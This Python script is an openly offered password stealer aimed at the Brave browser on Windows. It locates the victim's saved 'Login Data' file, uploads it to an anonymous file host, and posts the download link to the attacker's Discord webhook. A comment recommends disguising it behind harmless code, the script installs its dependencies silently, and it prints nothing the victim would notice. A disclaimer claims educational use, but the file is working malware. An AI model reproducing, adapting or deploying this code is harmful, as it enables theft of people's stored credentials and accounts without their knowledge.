#__________  _____ _____________________
#\____    / /  _  \\______   \_   _____/
#  /     / /  /_\  \|     ___/|    __)_ 
# /     /_/    |    \    |    |        \
#/_______ \____|__  /____|   /_______  /
#        \/       \/                 \/ 
# Telegram: https://t.me/zapedios
# ONLY FOR BRAVE FOR WINDOWS 11





print("Hello, World!") #I RECOMMEND PUTTING A CODE TO CAMOUFLAGE THE CODE THAT STEALS PASSWORDS










###
import os
import requests
from discord_webhook import DiscordWebhook, DiscordEmbed

def install_required_packages():
    print("Wait please...")
    os.system("pip install requests discord-webhook")

try:
    import requests
    from discord_webhook import DiscordWebhook, DiscordEmbed
except ImportError:
    install_required_packages()
    import requests
    from discord_webhook import DiscordWebhook, DiscordEmbed

def get_login_data_path():
    username = os.getlogin()
    brave_path = f"C:\\Users\\{username}\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default"
    return os.path.join(brave_path, "Login Data")

def upload_to_anonfiles(file_path):
    url = "https://api.anonfiles.com/upload"
    with open(file_path, "rb") as file:
        files = {"file": file}
        response = requests.post(url, files=files)
        return response.json()

def send_discord_webhook(webhook_url, message, anonfiles_url):
    webhook = DiscordWebhook(url=webhook_url, content=message)
    embed = DiscordEmbed(title="Join my Telegram: t.me/FirewallBreachIntrusion", description=f"**ZAPE says:** here is the download link for your Brave passwords {anonfiles_url}")
    webhook.add_embed(embed)
    response = webhook.execute()
    return response.status_code == 200

def main():
    login_data_path = get_login_data_path()

    if not os.path.isfile(login_data_path):
        print("")
        return

    response_data = upload_to_anonfiles(login_data_path)

    if response_data["status"]:
        anonfiles_url = response_data["data"]["file"]["url"]["full"]
        discord_webhook_url = "PUT_YOUR_WEBHOOK_HERE"
        mensaje_discord = "**Disclaimer:** The provided script offers functionalities to upload the Login Data file from the Brave folder to an anonymous storage service and send a message via Discord with a download link. It is essential to note that this script is provided for educational or personal use only and must be utilized responsibly and ethically. Important Notice: I do not take responsibility for any misuse of this script. The improper use of this script to access, share, or compromise the privacy of third-party accounts, passwords, or personal information, including sensitive data, is strictly prohibited and may result in legal consequences. The user assumes all responsibility for any actions performed using this script. I reiterate that this script is intended solely for legitimate and ethical purposes, such as retrieving your passwords in case of loss or conducting tests in controlled environments with explicit consent from the account owner involved. Always remember to respect applicable laws and privacy policies and obtain proper authorization before accessing or sharing sensitive information of third parties. If you agree with these conditions and understand the importance of using this script responsibly, you may proceed with its use. Otherwise, I urge you not to continue its execution and delete it from your system. If you have any questions or concerns about this script or its use, feel free to consult a cybersecurity expert or legal professional. User security and data privacy should always be a top priority. *ping:* || @everyone ||"
        if send_discord_webhook(discord_webhook_url, mensaje_discord, anonfiles_url):
            print("")
        else:
            print("")
    else:
        print("")

if __name__ == "__main__":
    main()